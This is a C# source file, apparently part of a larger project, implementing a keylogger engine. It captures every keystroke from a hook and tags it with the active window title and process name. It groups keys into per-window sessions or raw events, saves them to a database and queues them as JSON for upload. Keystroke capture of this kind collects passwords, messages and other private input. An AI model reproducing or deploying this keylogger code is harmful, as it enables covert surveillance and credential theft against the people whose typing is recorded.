using Common.ConfigurationManager;
using Common.Helpers;
using Common.Interfaces;
using Common.Models;
using KeyLogger.Interfaces;
using Newtonsoft.Json;
using System;
using System.Collections.Concurrent;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using System.Timers;
using System.Windows.Forms;

public class KeyLoggerEngine : IKeyLoggerEngine
{
    private KeySessions currentSession = null;
    private readonly ConcurrentQueue<string> keyQueue = new ConcurrentQueue<string>();
    private System.Timers.Timer idleTimer;
    private readonly int idleSeconds;
    private readonly bool isRawEnabled;
    private readonly ILogger logger;
    private readonly object sessionLock = new object();
    private DateTime lastKeyTime = DateTime.Now;

    public KeyLoggerEngine(ILogger logger = null)
    {
        this.logger = logger ?? new Logger();

        idleSeconds = ConfigurationManager.CurrentConfig.KLConfig.KeyLoggerSessionIdle;
        isRawEnabled = ConfigurationManager.CurrentConfig.KLConfig.KeyLoggerEnableRawEvents;

        this.logger.LogInformation($"KeyloggerEngine initialized. Raw mode: {isRawEnabled}, Idle timeout: {idleSeconds}s");

        if (!isRawEnabled)
        {
            idleTimer = new System.Timers.Timer(1000);
            idleTimer.Elapsed += CheckIdleTimeout;
            idleTimer.AutoReset = true;
            idleTimer.Start();

            logger.LogInformation($"Idle timer started with {idleSeconds} seconds timeout.");
        }

    }

    public async Task EnqueueKeyAsync(IntPtr lParam)
    {
        try
        {
            int vkCode = Marshal.ReadInt32(lParam);
            string key = ((Keys)vkCode).ToString();

            var helper = new ForegroundWindowHelper();
            string windowTitle = helper.GetActiveWindowTitle();
            string processName = helper.GetProcessName();

            if (isRawEnabled)
            {
                await SaveRawEventAsync(key, processName, windowTitle);
            }
            else
            {
                lock (sessionLock)
                {
                    lastKeyTime = DateTime.Now;
                }

                keyQueue.Enqueue(key);
                await ProcessKeyQueueAsync(windowTitle, processName);
            }
        }
        catch (Exception ex)
        {
            logger.LogError($"Error in EnqueueKeyAsync: {ex.Message}");
        }
    }

    private async Task ProcessKeyQueueAsync(string windowTitle, string processName)
    {
        await Task.Run(() =>
        {
            lock (sessionLock)
            {
                while (keyQueue.TryDequeue(out string key))
                {
                    if (currentSession == null)
                        StartSession(processName, windowTitle, key);
                    else if (currentSession.ProcessName != processName || currentSession.ProcessTitle != windowTitle)
                    {
                        Task.Run(async () => await CommitSessionAsync());
                        StartSession(processName, windowTitle, key);
                    }
                    else
                        AppendKey(key);
                }
            }
        });
    }

    private void StartSession(string processName, string windowTitle, string key)
    {
        currentSession = new KeySessions
        {
            ProcessName = processName,
            ProcessTitle = windowTitle,
            KeyText = key,
            KeyCount = 1,
            StartTime = DateTime.Now
        };
        logger.LogInformation($"[SESSION START] {processName} - {windowTitle} | Key: {key}");
    }

    private void AppendKey(string key)
    {
        currentSession.KeyText += key;
        currentSession.KeyCount++;
        logger.LogInformation($"[SESSION APPEND] {currentSession.ProcessName} - {currentSession.ProcessTitle} | Key: {key} | Total: {currentSession.KeyCount}");
    }

    private void CheckIdleTimeout(object sender, ElapsedEventArgs e)
    {
        lock (sessionLock)
        {
            if (currentSession != null)
            {
                var idleTime = DateTime.Now - lastKeyTime;
                if (idleTime.TotalSeconds >= idleSeconds)
                {
                    logger.LogInformation($"Idle timeout reached after {idleTime.TotalSeconds:F1} seconds.");
                    Task.Run(async () => await CommitSessionAsync());
                }
            }
        }
    }

    private async Task SaveRawEventAsync(string key, string processName, string windowTitle)
    {
        try
        {
            var ev = new KeyEvents
            {
                KeyText = key,
                ProcessName = processName,
                ProcessTitle = windowTitle,
                Timestamp = DateTime.Now
            };

            await Task.Run(() => DBContexts.Insert(ev));
            logger.LogInformation($"[RAW] {ev.ProcessName} - {ev.ProcessTitle} | Key: {ev.KeyText}");

            var uploadKeyEvent = new UploadQueue
            {
                PayloadType = "KeyEvent",
                PayloadJson = JsonConvert.SerializeObject(ev),
                IsSent = false
            };

            await Task.Run(() => DBContexts.Insert(uploadKeyEvent));
            logger.LogInformation("KeyEvent enqueued for upload.");
        }
        catch (Exception ex)
        {
            logger.LogError($"Error inserting KeyloggerEvent: {ex.Message}");
        }
    }

    public async Task CommitSessionAsync()
    {
        if (currentSession == null) return;

        currentSession.EndTime = DateTime.Now;

        try
        {
            var eve = new KeySessions
            {
                ProcessName = currentSession.ProcessName,
                ProcessTitle = currentSession.ProcessTitle,
                KeyText = currentSession.KeyText,
                KeyCount = currentSession.KeyCount,
                StartTime = currentSession.StartTime,
                EndTime = currentSession.EndTime
            };

            await Task.Run(() => DBContexts.Insert(eve));
            logger.LogInformation($"[SESSION COMMIT] {currentSession.ProcessName} - {currentSession.ProcessTitle} | Total keys: {currentSession.KeyCount} | Duration: {(currentSession.EndTime - currentSession.StartTime).TotalSeconds:F1}s");

            var uploadSession = new UploadQueue
            {
                PayloadType = "KeySession",
                PayloadJson = JsonConvert.SerializeObject(eve),
                IsSent = false
            };

            await Task.Run(() => DBContexts.Insert(uploadSession));
            logger.LogInformation("KeySession enqueued for upload.");
        }
        catch (Exception ex)
        {
            logger.LogError($"Error inserting KeySession: {ex.Message}");
        }

        currentSession = null;
    }

    public async Task ShutdownAsync()
    {
        logger.LogInformation("KeyloggerEngine shutting down.");

        if (!isRawEnabled)
        {
            lock (sessionLock)
            {
                idleTimer?.Stop();
                idleTimer?.Dispose();
            }

            await CommitSessionAsync();
        }
    }
}
